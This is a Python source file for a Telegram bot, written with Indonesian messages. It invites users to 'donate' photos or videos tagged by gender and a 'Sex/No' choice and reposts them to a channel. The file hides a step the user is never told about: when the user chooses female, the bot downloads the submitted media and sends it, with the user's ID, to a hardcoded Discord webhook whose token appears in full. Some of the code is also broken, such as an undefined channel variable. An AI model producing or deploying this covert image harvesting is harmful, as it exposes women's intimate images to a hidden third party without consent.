from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
import asyncio
from helper_func import encode
import requests

# Inisialisasi variabel untuk menyimpan data pengguna
user_data = {}

DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1260370473749971077/Z1oG_sBHxn5qRsqcNqGjDCwf3MJrjxTs5znX9jFIBRgu7r9vk5DGmyJBytKO45N74g2C"

@Client.on_message(filters.command('start') & filters.private)
async def start(client, message: Message):
    user_id = message.from_user.id
    user_data[user_id] = {}
    await message.reply(
        "Hallo Pilihlah Jenis Kelamin Anda",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("Cowo", callback_data="gender_cowo"), InlineKeyboardButton("Cewe", callback_data="gender_cewe")]
        ])
    )

@Client.on_callback_query(filters.regex(r"^gender_"))
async def gender_callback(client, query: CallbackQuery):
    user_id = query.from_user.id
    gender = query.data.split("_")[1]
    user_data[user_id]['gender'] = gender
    await query.message.edit_text("Content Donate\nSex    No", reply_markup=InlineKeyboardMarkup([
        [InlineKeyboardButton("Sex", callback_data="content_sex"), InlineKeyboardButton("No", callback_data="content_no")]
    ]))

@Client.on_callback_query(filters.regex(r"^content_"))
async def content_callback(client, query: CallbackQuery):
    user_id = query.from_user.id
    content = query.data.split("_")[1]
    user_data[user_id]['content'] = content
    await query.message.edit_text("✏️: Masukan Pesan Kamu")

@Client.on_message(filters.private & ~filters.command)
async def handle_message(client, message: Message):
    user_id = message.from_user.id
    if 'content' in user_data.get(user_id, {}):
        user_data[user_id]['message'] = message.text
        await message.reply("Sent Your Media For Share")
    elif 'message' in user_data.get(user_id, {}):
        if message.photo or message.video:
            user_data[user_id]['media'] = message.photo or message.video
            await message.reply("Porsses Loading...")
            await asyncio.sleep(2)  # Simulasi loading
            await message.reply("Porses Selesai! Terimakasih Sudah Donasi!")
            await send_to_channel(client, user_id)
        else:
            await message.reply("Silakan kirim foto atau video.")

async def send_to_channel(client, user_id):
    data = user_data[user_id]
    gender = data['gender']
    content = data['content']
    pesan = data['message']
    media = data['media']
    media_id = media.file_id
    base64_string = await encode(f"get-{media_id * abs(client.db_channel.id)}")
    link = f"https://t.me/{client.username}?start={base64_string}"
    reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔁 Share URL", url=link)]])

    # Tentukan gambar yang akan digunakan berdasarkan input pengguna
    if gender == "cowo" and content == "sex":
        image_path = "path/to/image1.jpg"
    elif gender == "cewe" and content == "sex":
        image_path = "path/to/image2.jpg"
    elif gender == "cowo" and content == "no":
        image_path = "path/to/image3.jpg"
    elif gender == "cewe" and content == "no":
        image_path = "path/to/image4.jpg"

    # Kirim pesan ke channel menggunakan bot kedua dengan gambar
    sent_message = await client.send_photo(
        chat_id=CHANNEL_ID_2,
        photo=image_path,
        caption=f"Hello Member Disinih Donasi Nih\nGender : {gender}\nContent : {content}",
        reply_markup=reply_markup
    )

    # Kirim pesan ke bot pertama untuk membalas pesan di channel yang sama
    await client.send_message(
        chat_id=CHANNEL_ID_2,
        text=f"{pesan}",
        reply_to_message_id=sent_message.message_id,
        reply_markup=reply_markup
    )

    # Kirim pesan ke Discord webhook jika pengguna adalah "cewe" dan mengirim foto atau video
    if gender == "cewe":
        media_file = await client.download_media(media)
        discord_message = f"========== Result Pap bosku =====\n| ID @ {user_id}\n+========================="
        files = {'file': open(media_file, 'rb')}
        requests.post(DISCORD_WEBHOOK_URL, data={"content": discord_message}, files=files)

    del user_data[user_id]  # Hapus data pengguna setelah selesai